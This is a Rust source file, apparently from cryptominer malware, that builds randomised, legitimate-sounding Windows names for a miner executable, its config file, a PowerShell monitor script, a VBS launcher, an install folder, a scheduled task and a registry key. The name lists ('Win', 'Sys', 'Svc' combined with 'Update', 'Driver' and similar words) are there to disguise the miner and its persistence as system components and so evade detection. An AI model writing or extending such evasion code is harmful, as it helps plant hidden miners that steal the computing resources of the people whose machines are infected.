use rand::seq::SliceRandom;
use rand::Rng;
use serde::{Deserialize, Serialize};

#[derive(Serialize, Deserialize, Clone)]
pub struct MorphConfig {
    pub miner_exe: String,
    pub config_file: String,
    pub monitor_script: String,
    pub launcher_script: String,
    pub install_dir: String,
    pub task_name: String,
    pub reg_key: String,
}

impl MorphConfig {
    pub fn generate() -> Self {
        let _rng = rand::thread_rng();
        
        let prefixes = ["Win", "Sys", "Net", "Cloud", "Host", "Svc"];
        let suffixes = ["Update", "Check", "Sync", "Config", "Driver", "Manager"];
        
        // Inline logic to avoid borrow issues
        let gen_name = |ext: &str| -> String {
             let p = prefixes.choose(&mut rand::thread_rng()).unwrap();
             let s = suffixes.choose(&mut rand::thread_rng()).unwrap();
             let id: u16 = rand::thread_rng().gen();
             format!("{}{}_{}.{}", p, s, id, ext)
        };

        let gen_task = || -> String {
            let p = prefixes.choose(&mut rand::thread_rng()).unwrap();
            let s = suffixes.choose(&mut rand::thread_rng()).unwrap();
            format!("{}{}", p, s)
        };

        MorphConfig {
            miner_exe: gen_name("exe"),
            config_file: gen_name("dat"),
            monitor_script: gen_name("ps1"),
            launcher_script: gen_name("vbs"),
            install_dir: gen_task(), 
            task_name: gen_task(),
            reg_key: gen_task(),
        }
    }
}
